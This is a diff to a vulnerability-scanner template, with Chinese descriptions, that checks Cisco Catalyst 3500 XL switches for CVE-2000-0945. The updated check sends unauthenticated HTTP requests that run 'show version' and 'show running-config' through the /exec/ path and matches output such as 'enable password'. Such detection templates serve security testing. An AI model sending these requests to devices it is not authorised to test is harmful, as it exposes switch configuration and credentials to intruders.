@@ -1,39 +1,44 @@
 [info]
 author = "ave"
-description = "验证Cisco Catalyst 3500 XL交换机Web配置界面的/exec/目录是否可被未认证访问，若返回命令行执行页面或命令执行结果，则存在任意命令执行漏洞"
+description = "检测 Cisco Catalyst 3500 XL 交换机 Web 配置接口未授权命令执行漏洞。当 enable 密码未设置时，访问 /exec/ 目录可执行任意系统命令。"
 id = "POC-AVE-2000-0691"
-name = "CVE-2000-0945 PoC"
+name = "Cisco Catalyst 3500 XL Arbitrary Command Execution PoC"
 severity = "critical"
-tags = ["ave-2000-0691"]
+tags = ["cve-2000-0945"]
 vuln_id = [
     "CVE-2000-0945",
     "AVE-2000-0691",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/exec/"
+path = "/{{BaseURL}}/exec/show version"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "exec",
-    "command",
-    "shell",
+    "Cisco Internetwork Operating System",
+    "IOS",
+    "show version",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/exec/show running-config"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "running-config",
+    "Current configuration",
+    "enable password",
 ]
